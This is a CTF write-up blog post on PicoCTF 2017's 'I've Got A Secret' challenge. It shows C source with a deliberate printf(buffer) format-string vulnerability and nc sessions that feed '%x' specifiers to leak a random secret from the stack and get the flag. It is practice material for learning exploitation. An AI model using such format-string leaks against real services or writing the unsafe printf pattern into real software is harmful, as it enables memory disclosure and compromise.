---
layout:     post
title:      "PicoCTF - I've Got A Secret"
subtitle:   "Write-Ups"
date:       2017-04-17 0:00:00
author:     "W3ndige"
permalink: /:title/
category: PicoCTF 2017
---

<p>Hopefully you can find the right format for my secret! Source. Connect on shell2017.picoctf.com:10750.</p>

{% highlight c %}
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF_LEN 64
char buffer[BUF_LEN];

int main(int argc, char** argv) {
    int fd = open("/dev/urandom", O_RDONLY);
    if(fd == -1){
        puts("Open error on /dev/urandom. Contact an admin\n");
        return -1;
    }
    int secret;
    if(read(fd, &secret, sizeof(int)) != sizeof(int)){
        puts("Read error. Contact admin!\n");
        return -1;
    }
    close(fd);
    printf("Give me something to say!\n");
    fflush(stdout);
    fgets(buffer, BUF_LEN, stdin);
    printf(buffer);

    int not_secret;
    printf("Now tell my secret in hex! Secret: ");
    fflush(stdout);
    scanf("%x", &not_secret);
    if(secret == not_secret){
        puts("Wow, you got it!");
        system("cat ./flag.txt");   
    }else{
        puts("As my friend says,\"You get nothing! You lose! Good day, Sir!\"");
    }

    return 0;
}
{% endhighlight %}

<p>We also have a small hint, telling us that it is vulnerable to format string exploit. From OWASP we can learn that. </p>

<p><i>The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system.</i></p>

<p>Now let's try connecting, and providing the program with some random input. </p>

{% highlight bash %}
w3ndige@W3ndige ~> nc shell2017.picoctf.com 10750
Give me something to say!
hello
hello
Now tell my secret in hex! Secret: hello
As my friend says,"You get nothing! You lose! Good day, Sir!"

{% endhighlight %}

<p>Exactly nothing happens. But we also now that our target is some value in hex format. Let's try to use format string exploit to get these numbers from a memory. It's possible by typing a few <b>%x</b>  parameters. </p>

{% highlight bash %}
w3ndige@W3ndige ~> nc shell2017.picoctf.com 10750
Give me something to say!
%x %x %x %x %x %x
40 f7fc7c20 8048792 1 ffffdd34 37bcd63a
Now tell my secret in hex! Secret: f7fc7c20
As my friend says,"You get nothing! You lose! Good day, Sir!"
w3ndige@W3ndige ~> nc shell2017.picoctf.com 10750
Give me something to say!
%x %x %x %x %x %x
40 f7fc7c20 8048792 1 ffffdd34 d2ad438b
Now tell my secret in hex! Secret: 8048792
As my friend says,"You get nothing! You lose! Good day, Sir!"
w3ndige@W3ndige ~> nc shell2017.picoctf.com 10750
Give me something to say!
%x %x %x %x %x %x
40 f7fc7c20 8048792 1 ffffdd34 ffa0c668
Now tell my secret in hex! Secret: ffffdd34
As my friend says,"You get nothing! You lose! Good day, Sir!"
{% endhighlight %}

<p>See how the last value changes each time we run a program. Since we now that secret is generated using <b>urandom</b>, we can guess that that's it. Let's run one last time. </p>

{% highlight bash %}
w3ndige@W3ndige ~> nc shell2017.picoctf.com 10750
Give me something to say!
%x %x %x %x %x %x
40 f7fc7c20 8048792 1 ffffdd34 26ef02ad
Now tell my secret in hex! Secret: 26ef02ad
1ba85d212f80746e0c61b8d45bc690b6
Wow, you got it!
{% endhighlight %}

<p>Another one! </p>
